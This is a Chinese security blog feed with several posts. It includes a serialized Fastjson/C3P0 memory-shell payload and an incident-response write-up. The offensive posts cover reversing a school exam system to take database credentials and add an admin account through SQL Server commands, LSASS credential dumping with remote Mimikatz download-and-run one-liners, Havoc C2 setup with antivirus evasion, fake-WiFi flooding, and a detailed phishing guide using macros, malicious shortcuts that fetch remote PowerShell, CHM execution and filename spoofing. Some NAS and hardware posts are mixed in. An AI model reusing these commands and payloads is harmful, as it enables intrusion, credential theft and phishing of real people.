27285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002600040024000a002700670000000c00010000000b0068006900000001006a006b00020065000000350000000200000001b10000000200660000000600010000002a00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00010070007100020065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000002d0006002e000c002f00150030001e0031002a00320036003300420034004a003500590037006c0038007600390087003a009d003b00aa003c00bb003d00d4003e00e4003f00f5004001110041012400420135004301540044016a0045017b00470194004801a2004b01aa004e006700000098000f0076001100720073000900aa001100720073000900e4001100720073000901240011007200730009016a001100720073000901940016007200730009000001ab006800690000000001ab007400750001000001ab007600770002000001ab007800790003000601a5007a007b0004000c019f007c007d000500150196007e007f0006001e018d008000810007004a016100820083000800840000000c0001001e018d0080008500070086000000330007ff0087000907008707008807008907008a07008b07008c07008d07008e07008f000033393ffb0045fc0026070090fa0007006e0000000600020091006f000100920064000100650000002b0000000100000001b10000000200660000000600010000005100670000000c00010000000100680069000000010093009400020065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000054000a005700270058002d00590030005c0038005f003b005d003d005e006100610071006200770063008c0064009e006500a4006600a8006700b2006800b9006900cd006a00e8006b00fd006c0104006d0116006e011c006f012d007101300070013200730067000000c00013003d002400950096000900270106009700980007003000fd009900730008007100bc009a009b0009008c00a1009c009d000a009e008f009e0098000b00a80085009f0061000c00b9007400a000a1000d00e8004500a200a3000e00fd003000a40073000f0104002900a5009d00100116001700a60098001100000133006800690000000001330072007300010000013300820083000200000133007e007f000300000133007a007b000400000133008000810005000a012900a700a3000600840000000c0001000001330080008500050086000000480004ff003b000907008707009007008f07008d07008b07008e07001d0700a807009000010700a925ff00ce000707008707009007008f07008d07008b07008e07001d00010700aa0100ab0000000200ac000100ad00ae000200650000003f0000000300000001b1000000020066000000060001000000760067000000200003000000010068006900000000000100af00b000010000000100b100b20002006e00000004000100b3000100ad00b400020065000000490000000400000001b10000000200660000000600010000007900670000002a0004000000010068006900000000000100af00b000010000000100b500b600020000000100b700b80003006e00000004000100b3000800b9006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007d0003007e000d007f001a008000250081002a0082003400830040008400490085005200860059008700600088006d00890073008a007c008b0083008c008a008d0095008e009b008f00b0009000b6009100cd009200d9009500dc009400dd0097006700000066000a0049009000ba00bb00050052008700bc00bd0006007c005d00be00bf000700b00029009a009b000800cd000c006c00c00009000300d600c100610000000d00cc00c200c30001001a00bf00c400c50002002500b400c600c70003003400a500c80081000400860000000a0003fb00d9420700aa00000200c90000000200ca01460000000a000100e400e101450009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e00057870000000297400087365632e43335030740009433350302e6a61766174000367656e7371007e00170000001171007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&quot;,    &#125;&#125;

直接打会发现再次被拦了，说明过滤的userOverridesAsString

直接对其Unicode编码绕过发现还是无法绕过，不过可以通过添加_或+处理关键字绕过

可参考：https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/


出现上述报错则说明内存马注入成功

应急响应Ⅲ首先排查隐藏用户、端口、进程等并无异常，接着发现存在ssh后门，直接删除即可
/home/vulntarget/ &gt;cat ~/.ssh/authorized_keysssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEisTimbKUHUXBUJUo4WbOxTQY9VHM1ZaL35RQgBTwNUWlm353XdHcq8HxA1U9MLp/Lepaw/U5tQ5Y2qF9TzhAUoTiAiwAKREFuLHugeL/eWTyZAnRN/2OQ4XX5IBsMDFbZAvNRUSaOLIAtpNz/ZFj1NDuCWR7p/2EYFB0YvHxaS9OWrUb0Zh21GOQR6apCYY/+IbVVGKr+MwlI0Df0kv7hns9IpapwEctI0rzayL+NYtvFUyterTV4HfnPij7LxyGqK62ZEsJOQSnON+mj1Dp6Ukz1krdUoVmxrEseQe6CJemq3BHolDi7zbQo4BbxnTQUYwzl9li04ZL2h75xQuUEPb6nxVanUEEJ7CT/fIclvCHsdO9MJ5l2V8ROetkukslKlPxEVZ8q2Up1S4SQk90cYLLnj2+wJNSNw343kIOrIjtQY8E16RhVqVMMGmKW5Ui/FU6X/lfKjISjxqBN6HB65Q74ISMD+IN3kVPSI52rwqaea5/TdjKiDxzkO8bAXU= hacker@anonymous

其次在&#x2F;var&#x2F;local&#x2F;目录下也有个app.jar，下载下来反编译看看并未发现异常

拿D盾检测也没发现异常文件

然后用copagent工具检测，运行后会识别正在运行的应用，输入对应ID，会在同目录下生成.copagent目录储存结果

https://github.com/LandGrey/copagent/raw/release/cop.jar


result.txt中记录所有的类及危险等级

在class目录下会保存木马以及运行的类

还原出内存马（IceShell是我自己打进去的可以排除掉，剩下就是异常的
ShellServlet存在很明显的exec

HttpServlet也不难看出很有可能就是内存马

还可以拿D盾来扫描检查

这里热更新我们换一种方式，直接利用Arthas工具反编译并提取ShellServlet类的代码
jad --source-only ShellServlet &gt; /tmp/ShellServlet.java


接着去&#x2F;tmp目录下找到ShellServlet.java进行修改

然后直接让他的类加载器去编译，再去热更新即可
sc -d *ShellServlet | grep classLoaderHashmc -c 56ae04b4 /tmp/ShellServlet.java -d /var/retransform /var/ShellServlet.class 


同理对HttpServlet类进行热更新
jad --source-only ShellServlet &gt; /tmp/ShellServlet.javavim /tmp/HttpServlet.javasc -d *HttpServlet | grep classLoaderHashmc -c 49c2faae /tmp/HttpServlet.java -d /var/retransform /var/javax/servlet/http/HttpServlet.class



应急成功，拿下flag3：flag{57f92fa987141af1770d2b0ca894960f}

]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
        <tag>应急响应</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>入门OD打开逆向世界大门之日穿我校某考试系统软件</title>
    <url>/2021/11/09/%E5%85%A5%E9%97%A8OD%E6%89%93%E5%BC%80%E9%80%86%E5%90%91%E4%B8%96%E7%95%8C%E5%A4%A7%E9%97%A8%E4%B9%8B%E6%97%A5%E7%A9%BF%E6%88%91%E6%A0%A1%E6%9F%90%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[前言这学期上数据库课用到了我校某老师自己开发的一个考试系统软件，然后在一次小测中这垃圾系统我语句明明就是对的，可它编译就一直报错说我语法错误，实在受不了那就来盘一下他（授权测试的，用户在测试成功后已删除。
注：此文章仅限于安全研究，违法犯罪与作者无关！
逆向分析将程序载入OD这个程序是加了一个ASPack的壳子，直接用ESP定律找到OEP

F9运行到了OEP附近，走过这个retn

现在就来到了OEP（如果你的OD显示的都是db的话用右键-&gt;分析-&gt;从模块中删除目标扫描），然后删掉之前下的硬件断点

然后继续单步……（balabala
或者我们直接利用工具将它脱壳然后将其导入，右键-&gt;中文搜索引擎-&gt;智能搜索

接着搜索字符串password&#x3D;我们的目的是找数据库的连接信息

然后跟随过去后在段首下一个断点

F9运行程序，发现程序已经段下来了，右边的寄存器窗口中显示的就是连接信息，但不全面

继续F8单步，运行到我们找到的 password= 附近的call，看到堆栈窗口中已经完全显示了连接信息

渗透提权得到账号密码后，我们就开始sqlserver连接到服务器

这里我们是可以调用cmd执行命令的，whoami 发现是 system
declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text


于是我们就开始增加用户并给新建的账号管理员权限
declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user 用户名 密码 /add &gt;c:\log.txt&#x27; declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 用户名 /add &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text

最后mstsc成功连上

]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>Harvey</tag>
      </tags>
  </entry>
  <entry>
    <title>导出Lsass.exe的一些手法</title>
    <url>/2021/02/17/%E5%AF%BC%E5%87%BALsass.exe%E7%9A%84%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[1. Procdump 转储Lsass.exe 的内存前提：需要管理员及以上权限
常用命令：
procdump  -accepteula -ma lsass.exe lsass_dump

导出的.dmp文件本地配合minikatz 取出密码
sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswords

如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用更香：
procdump -accepteula -ma pid lsass.dmp

2. wce导出hash前提：需要管理员及以上权限，版本限制（仅支持Windows XP，2003，Vista7、2008和Windows 8）
命令：
wce.exe -o file.txtwec.exe

3. comsvcs.dll转储LSASS.exe内存前提：在powershell中运行，管理员权限以上
命令：
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full

清理：
Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore

4.使用系统调用和拜托hook的api转储LSASS.exe内存详情请查看这篇文章：
https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
这是一篇非常nice的文章，值得一看，打开一个新世界的大门！
有关github项目：
https://github.com/outflanknl/Dumpert
命令：
dumpert_exe或者rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

运行效果截图：

5.Windows Task Manager转储LSASS.exe内存直接打开任务管理器，找到lsass.exe进程，右键选中右键

6.Mimikatz前提：管理员权限以及以上，建议自己编译源码去掉一些特征字符，一些不必要的语句
命令：
mimikatz_exe &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::logonpasswords full&quot; exit

powershell：
#读取明文密码powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts#读取hashpowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes

猕猴桃杀软重点看照对象之一。
7.pypykatz读取LSASS前提：必须安装python3，管理员权限以及以上
命令：
#安装pip install pypykatz#使用pypykatz live lsa

抓得不只是lsass，还有其他的。
运行效果：

杀软拦截概率很低
8. Out-Minidump.ps1 转储 LSASS.exe内存前提：powershell，管理员权限以及以上
命令：
powershell “IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;); get-process lsass | Out-Minidump”

清除文件：
Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore


杀软会拦截。
]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>凭证获取</tag>
      </tags>
  </entry>
  <entry>
    <title>Havoc C2使用指南</title>
    <url>/2022/11/02/havoc/</url>
    <content><![CDATA[搭建Havoc C2
Havoc是一个现代的、可塑性强的后渗透C2框架，go版本的cs

设置环境
apt update -y &amp;&amp; apt upgrade -y# ①.仅适用于基于 Debian 的发行版sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm# ②.Ubuntu 20.04 / 22.04sudo apt install build-essentialsudo add-apt-repository ppa:deadsnakes/ppasudo apt updatesudo apt install python3.10 python3.10-dev

下载havoc
git clone https://github.com/HavocFramework/Havoc.git

搭建服务端
cd Havoc/Teamserverbash Install.shmakevim profiles/havoc.yaotl./teamserver server --profile profiles/havoc.yaotl -v


默认账号密码为5pider/password1234

搭建客户端
cd Havoc/Clientmake./Havoc

客户端会弹出如下窗口，填写一下相关信息连接即可

接着就成功进入Havoc的界面

点击View - Listeners设置侦听器，然后在最底下找到Add点击添加


接着点击Attack - Payload选择Windows Shellcode，点击Generate将shellcode保存

设置 Harriet Payload 框架
Harriet可以将加密 shellcode 和函数调用，使用 SigThief 使用伪造的 Microsoft 证书对二进制文件进行签名

安装Harriet
git clone https://github.com/assume-breach/Home-Grown-Red-Team.gitcd Home-Grown-Red-Team/Harrietbash setup.shbash Harriet.sh


这里我们选用Fully-Automated AES Encryption，将之前保存的demon.bin路径输入进行编译

接着设置web服务

最终测试一下免杀效果，成功上线



]]></content>
      <categories>
        <category>研究随笔</category>
      </categories>
      <tags>
        <tag>Havoc</tag>
      </tags>
  </entry>
  <entry>
    <title>年轻人的第一台NAS</title>
    <url>/2023/02/25/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0NAS/</url>
    <content><![CDATA[准备工作需要购置的零件有机箱（可以自己单独购买电源）、主板、内存条、硬盘
1.机箱这里我买的是拓普龙6盘位NAS服务器机箱，不过不建议买6口的（贼难装，难怪没啥人买这款，早知道就不贪便宜直接买个8口的机箱要好装多了🤔）

开箱如下，还不错的一点就是给配了一大包螺丝😘但是没分开来包装不好找要用的


2.电源这里电源我是单独购买的台达150W电源（他喵的~我买的时候还需要12块运费，现在就变免运费啦🤡

开箱如下，一块电源以及一根电源线

3.主板主板我选的是映泰j4125，买的时候涨价了好贵~ 于是我选择了pdd购买能便宜挺多的


4.内存条内存要求就不是很高了，随便买个4G的就行，不过有点需要注意的是颗粒数量，一定得买4颗粒的，商家一般都不会写出来所以比较坑

如果不是4颗粒的，测试的时候就会出现如下问题，毫无反应（我这个内存应该拆开是8颗粒的😣以及这里U盘是要插在后面主板上的）

5.硬盘这里我选的是海康威视的监控硬盘，两块4T的大概就花了七百块，依旧还是上pdd采购节省开销

安装过程其实nas说好装也好装，说不好装也不好装😂就是一个萝卜一个坑
先把电源根据机箱的结构固定到对应位置，再把电源上的线装好（这里想喷一下它这里接线可困难了，后板焊住了不能拆开，并且和sata线混在一块，可以说毫无发力点），这里我没有装扩展卡就只用到两根sata线，所以风扇也就没必要插上，需要注意的是硬盘线一定得按顺序接上并记住它

然后就是主板了，先把我们要用到的两跟sata线按主板上写的1、2对应装上，再找到usb线和电源线找到对应位置装上，以及4pin、24pin线，内存条，然后根据机箱结构装上主板。这里想喷一下主板那里的螺丝孔特别歪，后面手被割了好几个口才勉强固定住（下图内存还没插上就是因为它翻车）

组装好后不着急把壳装上，需要测试一下能不能用，先插上显示屏的HDMI线和装好pe的U盘，再插上电源线，效果如下：

亮起来一般就没啥问题了，最后成功进入pe就可以装上了

最后关机，把硬盘装好插上即可开始nas之旅😁

]]></content>
      <categories>
        <category>折腾实录</category>
      </categories>
      <tags>
        <tag>NAS</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次生成虚假WiFi</title>
    <url>/2022/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87WiFi/</url>
    <content><![CDATA[前期准备kali + 无线网卡
操作过程首先我们需要装一下mkd3
sudo apt-get install mdk3

接着连下我们的无线网卡

然后我们 iwconfig 查看下是否真的连上

添加mon0
iw wlan0 interface add mon0 type monitoriwconfig 检测一下是否成功


填写WiFi名字
vi wifi.lst输入i进行编辑（如果你不知道的话我给你提醒一下输入你想要取的WiFi名字Ctrl+C 然后 :wq或者:x实现保存并退出（如果你不知道的话我给你提醒一下


最后生成WiFi
mdk3 mon0 b -f wifi.lst


]]></content>
      <categories>
        <category>研究随笔</category>
      </categories>
      <tags>
        <tag>fakewifi</tag>
      </tags>
  </entry>
  <entry>
    <title>网络钓鱼</title>
    <url>/2021/02/20/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[前言：涵盖了现在大多数红队钓鱼的手法，一直以来钓鱼配合免杀，更能出奇制胜！
1. excel宏执行任意命令新建一个exel表，然后打开，对准这个右键点击插入宏。

然后在第一切换到宏，复制粘贴如下语句：
=EXEC(&quot;notepad&quot;)=HALT()

必须带&#x3D;HALT()，不然虽然命令执行了，但会报错，容易露馅！
然后测试一下，选中语句，右键，点击执行：

就会弹出notepad：

通过msf生成msi文件，python开启http服务，然后替换命令为攻击载荷，右键隐藏宏，并把文件执行方式改为
Auto_open，直接复制粘贴，按一下enter就行了


然后另存，2016版本记得点击否，然后得选择一个启用宏的文件，远方服务器监听：

就欧克了，当然这里肯定不止这个msi文件，都能执行命令了，该怎么利用，你懂的！
2 Link钓鱼：随便选择一个应用或者文件，右键点击创建快捷方式，右键打开属性：

我们需要更改目标这里的目标，这里的目标路径改成我们的攻击载荷，下面的起始位置可以不更改，基本上没啥影响。
修改：
C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -exec bypass - -c &quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;//192.168.1.109/1.ps1&#x27;))


选择更改图标，因为我这里改成了cmd，快捷方式对应的图标也会更改为cmd，需要更改一下图标，查找图标路径改成shell32.dll 这里存放这windows系统所以的图标，不建议去自己加，因为你要发送给受害者，不能保证受害者电脑上有此图标

然后再改一下快捷方式名字，比如像我这样，必须得诱人一点！

那么一个link 钓鱼就完成了，但是这个放出去杀软立马干死，好人做到底，再来个过静态的免杀语句混淆。
cmd.exe /c &quot;FOR /F &quot;delims=s\ tokens=4&quot; %a IN (&#x27;set^|findstr PSM&#x27;)DO %a IEX (New-ObjectNet.WebClient).DownloadString(&#x27;http://bit.ly/L3g1t&#x27;)&quot;

3 CHM文档钓鱼：新建一个文件夹，新建一个index.html，文件内容为
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;


然后打开Easy CHM程序，新建，浏览，选择我们建立好的目录，然后确定：

然后点击编译，然后就会生成一个chm文档

那么我们这里只需要打开这个文件，就会执行里面的命令

从代码上来看，chm文件是可以执行js代码的，那么就可以配合jsbackdoor 来进行权限获取，这里推荐一个项目：
https://github.com/Ridter/MyJSRat
一个py版本的JSbackdoor
4.文件钓鱼钓鱼方式的开山鼻祖，很古老了，原理就是利用一般人是不会打开显示已知的文件扩展名，而windows正常情况下不会显示已知的文件扩展名，但是从事信息安全的人员一般都打开了的。
这里制作也挺简单的，只需要更换一个图标就行，这里先用cs随便生成一个exe

然后我把显示已知的文件扩展名关掉
首先把exe文件拖到resource hacker里，成功后面显示文件名，然后点击增加一个资源


然后选择ico图标

然后点击保存即可

那么就成了鸭！

5. 自解压钓鱼我这里就用刚刚改好的木马了，创建自解压文件：

点击高级，自解压选项，常规，设置自解压路径

点击设置，设置解压后运行文件的路径

模式选择全部隐藏

更新设置成覆盖所有文件，保证二次自解压不报错，不会引起怀疑

然后修改文件名和图标进行伪装就欧克了
6.word宏钓鱼新建一个word，打开，然后点击视图，宏，查看宏，选择当前文档，点击创建

然后cs生成宏代码，复制粘贴进去

然后另存为docm文档？你以为就这样？
NO，咱们玩骚一点，我在网上随便找了个模板复制粘贴进去，然后截图，另存为

打开我们的神器，美图秀秀，打开我们刚截图的图片，点击背景虚拟化，调整虚拟化程度，最好是那种弱影弱现的感觉最nice，然后加上一些说明嗷

然后设置图片尺寸为790，1120

然后保存，然后就可以看到效果了

为什么会设置成790x1120勒，只是为了刚好覆盖word里面的文本，然后docx文档另存为doc文档
然后打开，去开启显示开发者工具选项卡，文件-&gt;选项-&gt;自定义功能区-&gt;主选项卡-&gt;开发者工具

然后点击开发者工具，选择图像（Active控件）

设置图像格式为浮于文字上方，并把图像拉满

效果就是这样，会把文字全部覆盖

然后点击图像属性，设置成我们做好的图片，然后点击宏创建宏，cs生成宏木马

复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了
Project.ThisDocument.Image1.Top = 0Project.ThisDocument.Image1.Width = 0


成品展示：

那么点击启用宏，图片就好消失，显示出正常的文件来。
还有一种是远程加载的方式，先创建一个带有宏木马的文档另存为dotm后缀当成模板，放在远程服务器上，开启http服务，然后再新建一个模板word，改后缀改成zip，然后解压。

然后找到这个文件settings.xml.rels，编辑

替换成我们远程的宏木马文件的链接：

然后再把它压缩了，文件后缀又改回成docx，那么就成了，这种免杀效果要好一点，远程加载嘛。
8.伪造网站钓鱼那么我们先来看cs中的clone web的模块

填入克隆网站的url，可以选择进行键盘记录，然后点击就能克隆，但是有些网站也克隆不了，受到协议的保护，那么克隆好之后就可以点击进行管理

那么就来讲讲cs中的邮件钓鱼板块

导入收件人，这里邮件和名字一定要用tab键分开，再导入模板的文件的时候，去选择一封你需要伪造的正常文件，然后点击选择显示文件原文，复制粘贴就行，achment就是附件，可以加入你的免杀马，word，什么的，embed项就是点击之后要跳转的页面，那么可以配合clone web使用，填入我们cs服务器克隆的网站url，然后就是设置邮件服务器。

Bounce to 选项就是你伪造好的邮箱，你可以伪造成admin@qq.com什么的，但是大多数邮件服务器有防御，会显示代发人，发之前还可以点击Preview进行预览
再来给flash钓鱼网站，当我们找到一个网站的后台，顺利进去了，但是任何getshell的点，就只找到一个xss，那么如何getshell勒？这时候就来一波flash钓鱼把
建立网站


我们找到index.html中的立即下载所在的标签，url替换成我们的木马下载链接

那么我们如何让管理员重定向过来？这里新建一个js文件，文件内容如下，然后我们的xss脚本调用这段js文件
window.alert = function(name) &#123;    var iframe = document.createElement(&quot;IFRAME&quot;);    iframe.style.display=&quot;none&quot;;    iframe.setAttribute(&quot;src&quot;,&#x27;data:text/plain,&#x27;);    document.documentElement.appendChild(iframe);    window.frames[0].window.alert(name);    iframe.parentNode.removeChild(iframe);&#125;alert(&quot;您的flash版本过低，尝试升级后访问该页面！&quot;);window.location.href=&quot;http://www.xxx.com&quot;



当然为了保险起见，我们得配合自解压钓鱼，现在压缩得是两个文件，一个是木马文件，另一个是flash正常安装程序，两个文件都得执行，通过修改资源图标，伪装成flash安装程序，
就可以getshell了！
9.unicode反转文件后缀钓鱼Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。而如上技术正是使用了Unicode的RLO（开始从左向右覆盖），Unicode定义的 Start of right-to-left override，控制字符是RLO，ASCII码是0x3F。只要在一行字符前面加上一个0x3F就可以实现文本的反向排列。这个0x3F是Unicode为了兼容阿拉伯文字从左至右的阅读习惯设计的一个转义字符。
选择木马，重命名，然后点击插入unicode控制字符

完成之后

]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>钓鱼攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>浅记米家电脑开机卡的安装</title>
    <url>/2023/02/12/%E6%B5%85%E8%AE%B0%E7%B1%B3%E5%AE%B6%E7%94%B5%E8%84%91%E5%BC%80%E6%9C%BA%E5%8D%A1%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[准备工作简单的记录一下利用米家电脑开机卡配合小爱音响实现语言控制开关机
我们只需要购置个最便宜的米家mesh开机卡mini版即可（当然电脑和小爱音响这边已经有了🤣）



安装过程步入正题，拆开自己的电脑，断开电源并将开机卡插到主板对应位置
下面以我的主板为例，需要插拔的地方就是如下两处

